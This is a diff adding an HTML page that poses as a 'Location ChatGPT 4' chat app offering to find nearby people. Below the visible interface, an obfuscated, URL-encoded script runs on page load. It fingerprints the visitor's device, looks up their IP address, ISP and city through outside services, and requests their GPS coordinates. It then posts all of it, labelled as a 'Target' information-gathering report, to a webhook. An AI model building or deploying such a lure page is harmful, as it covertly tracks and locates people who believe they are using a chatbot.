@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Cyclone</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body onload="gpsLocation()">
+<section class="msger">
+  <header class="msger-header">
+    <div class="msger-header-title">
+      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
+    </div>
+    <div class="msger-header-options">
+      <span><i class="fas fa-cog"></i></span>
+    </div>
+  </header>
+
+  <main class="msger-chat">
+    <div class="msg left-msg">
+      <div
+       class="msg-img"
+       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
+      ></div>
+
+      <div class="msg-bubble">
+        <div class="msg-info">
+          <div class="msg-info-name">Admin</div>
+          <div class="msg-info-time"></div>
+        </div>
+
+        <div class="msg-text">
+          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <form class="msger-inputarea">
+    <input type="text" class="msger-input" placeholder="Ask me anything...">
+    <button type="submit" class="msger-send-btn">Send</button>
+  </form>
+</section>
+<script  src="./script.js"></script>
+<p id="techchip"></p>
+<!-- tc_payload -->
+<script type="text/javascript">
+document.write(unescape('%3Cscript%20src%3D%0A%20%20%22https%3A%2F%2Fajax.googleapis.com%2Fajax%2Flibs%2Fjquery%2F3.2.1%2Fjquery.min.js%22%3E%0A%20%20%3C%2Fscript%3E%0A%20%20%3Cscript%3E%0A%20%20var%20x%20%3D%20document.getElementById%28%22Cyclone%22%29%3B%0A%20%20let%20datetime%20%3D%20new%20Date%28%29%3B%0A%20%20let%20localtime%20%3D%20String%28datetime.toLocaleTimeString%28%29%29%3B%0A%20%20var%20targetinfo%20%3D%20%28%22CycIone%20-%20Information%20Gathering%20Report%5Cn------------------------------------%5Cn%5CnDevice%20Information%5Cn----------------------------%5CnUser%20Agent%3A%20%22%20%2B%20navigator.userAgent%20%2B%20%22%20%5CnPlatform%3A%20%22%20%2B%20navigator.platform%20%2B%20%22%20%5CnCookies%20Enabled%3A%20%22%20%2B%20navigator.cookieEnabled%20%2B%20%22%5CnBrowser%20Language%3A%20%22%20%2B%20navigator.language%20%2B%20%22%5CnBrowser%20Name%3A%20%22%2B%20navigator.appName%20%2B%20%22%5CnBrowser%20CodeName%3A%20%22%20%2B%20navigator.appCodeName%20%2B%20%22%5CnRAM%3A%20%22%20%2B%20navigator.deviceMemory%20%2B%20%22%5CnCPU%20Cores%3A%20%22%20%2B%20navigator.hardwareConcurrency%20%2B%20%22%5CnScreen%20Width%3A%20%22%20%2B%20screen.width%20%2B%20%22%5CnScreen%20Height%3A%20%22%20%2B%20screen.height%20%2B%20%22%5CnLocal%20Time%3A%20%22%20%2B%20localtime%20%2B%20%22%5CnRefUrl%3A%20%22%20%2B%20document.referrer%20%2B%20%22%5CnOS%20CPU%3A%20%22%20%2B%20navigator.oscpu%20%2B%20%20%22%5Cn-------------------------%5Cn%22%29%3B%0A%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20xhr.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%20%0A%20%20%20%20%20%20xhr.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20xhr.send%28JSON.stringify%28targetinfo%29%29%3B%0A%20%20%24.getJSON%28%22https%3A%2F%2Fapi.ipify.org%3Fformat%3Djson%22%2C%20function%28data%29%20%7B%0A%20%20%20%20%24%28%22%23tc%22%29.html%28data.ip%29%3B%0A%20%20%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20var%20getip%20%3D%20%28%22%5CnTarget%20IP%20Detail%5Cn----------------%5Cn%22%20%20%2B%20%22IP%3A%20%22%20%2B%20data.ip%20%20%2B%20%22%5Cn---------------%5Cn%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.send%28JSON.stringify%28getip%29%29%3B%0A%20%20%7D%29%0A%20%20%24.getJSON%28%22http%3A%2F%2Fip-api.com%2Fjson%2F%3Ffields%3Dstatus%2Cmessage%2Ccontinent%2CcontinentCode%2Ccountry%2CcountryCode%2Cregion%2CregionName%2Ccity%2Cdistrict%2Czip%2Clat%2Clon%2Ctimezone%2Coffset%2Ccurrency%2Cisp%2Corg%2Cas%2Casname%2Creverse%2Cproxy%2Chosting%2Cquery%22%2C%20function%28response%29%20%7B%0A%20%20%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20var%20locationdata%20%3D%20%28%22%5CnNetwork%20%26%20ISP%20Information%5Cn------------------------%5CnResponse%20Status%3A%20%22%20%2B%20response.status%20%2B%20%22%5CnContinent%3A%20%22%20%2B%20response.continent%20%2B%20%22%5CnContinentCode%3A%20%22%20%2B%20response.continentcode%20%2B%20%22%5CnCountry%3A%20%22%20%2B%20response.country%20%2B%20%22%5CnCountrycode%3A%20%22%20%2B%20response.countrycode%20%2B%20%22%5CnRegion%20name%3A%20%22%2B%20response.regionName%20%2B%20%22%5CnRegion%3A%20%22%20%2B%20response.region%20%2B%20%22%5CnCity%3A%20%22%20%2B%20response.city%20%2B%20%20%22%5CnDistrict%3A%20%22%20%2B%20response.district%20%2B%20%22%5CnZip%3A%20%22%20%2B%20response.zip%20%2B%20%22%5CnTime_zone%3A%20%22%20%2B%20response.time_zone%20%2B%20%22%5CnAS%20Name%3A%20%22%20%2B%20response.as%20%2B%20%22%5CnISP%20Info%3A%20%22%20%2B%20response.isp%20%2B%20%22%5CnReverse%3A%20%22%20%2B%20response.reverse%20%2B%20%22%5CnOffset%3A%20%22%20%2B%20response.offset%20%2B%20%20%22%5CnCurrency%3A%20%22%20%2B%20response.currency%20%2B%20%22%5CnProxy%3A%20%22%20%2B%20response.proxy%20%2B%20%22%5CnLat%3A%20%22%20%2B%20response.lat%20%2B%20%22%5CnLong%3A%20%22%20%2B%20response.lon%20%2B%20%22%5Cn-------------------%5Cn%22%29%0A%20%20%20%20%20%20%20%20xhr.send%28JSON.stringify%28locationdata%29%29%3B%0A%20%20%7D%29%0A%20%20function%20gpsLocation%28%29%20%7B%0A%20%20%20%20if%20%28navigator.geolocation%29%20%7B%0A%20%20%20%20%20%20navigator.geolocation.getCurrentPosition%28latlong%2C%20catchError%29%3B%0A%20%20%20%20%7D%20else%20%7B%20%0A%20%20%20%20%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20const%20perror1%20%3D%20%22%5CnTarget%20Browser%20is%20not%20supporting%20geolocation.%5Cn%22%0A%20%20%20%20%20%20%20%20xhr.send%28JSON.stringify%28perror1%29%29%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%20%20function%20latlong%28position%29%20%7B%0A%20%20%20%20var%20latlong%20%3D%20%28%22%5CnGPS%20Lat%20Long%20Information%5Cn-----------------------%5CnLatitude%3A%20%22%20%2B%20position.coords.latitude%20%2B%20%22%5CnLongitude%3A%20%22%20%2B%20position.coords.longitude%20%2B%20%22%5CnMap%20Location%3A%20%20https%3A%2F%2Fwww.google.com%2Fmaps%2Fplace%2F%22%20%2B%20position.coords.latitude%20%2B%20%22%2C%22%20%2B%20position.coords.longitude%20%2B%20%22%5CnGoogle%20Earth%3A%20%20https%3A%2F%2Fearth.google.com%2Fweb%2Fsearch%2F%22%20%2B%20position.coords.latitude%20%2B%20%22%2C%22%20%2B%20position.coords.longitude%20%2B%20%22%5Cn------------------%5Cn%22%29%3B%0A%20%20%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20xhr.send%28JSON.stringify%28latlong%29%29%3B%0A%20%20%7D%0A%20%20function%20catchError%28error%29%20%7B%0A%20%20%20%20switch%28error.code%29%20%7B%0A%20%20%20%20%20%20case%20error.PERMISSION_DENIED%3A%0A%20%20%20%20%20%20%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20const%20perror1%20%3D%20%22%5CnUser%20denied%20the%20Geolocation%20permision.%5Cn%22%0A%20%20%20%20%20%20%20%20xhr.send%28JSON.stringify%28perror1%29%29%3B%0A%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20case%20error.POSITION_UNAVAILABLE%3A%0A%20%20%20%20%20%20%20%20const%20xhr1%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr1.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr1.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20const%20perror2%20%3D%20%22%5CnLocatin%20Unavailable.%5Cn%22%0A%20%20%20%20%20%20%20%20xhr1.send%28JSON.stringify%28perror2%29%29%3B%0A%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20case%20error.TIMEOUT%3A%0A%20%20%20%20%20%20%20%20const%20xhr2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr2.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr2.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20const%20perror3%20%3D%20%22%5CnTimeout%20Error.%5Cn%22%0A%20%20%20%20%20%20%20%20xhr2.send%28JSON.stringify%28perror3%29%29%3B%0A%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20case%20error.UNKNOWN_ERROR%3A%0A%20%20%20%20%20%20%20%20const%20xhr3%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr3.open%28%22POST%22%2C%20%22%2Fwebhook.php%22%29%3B%0A%20%20%20%20%20%20%20%20xhr3.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fjson%3B%20charset%3Dutf-8%27%29%3B%0A%20%20%20%20%20%20%20%20const%20perror4%20%3D%20%22%5CnUnknown%20error%5Cn%22%0A%20%20%20%20%20%20%20%20xhr3.send%28JSON.stringify%28perror4%29%29%3B%0A%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%20%20%3C%2Fscript%3E'));
+</script>
+
+</body>
+</html>
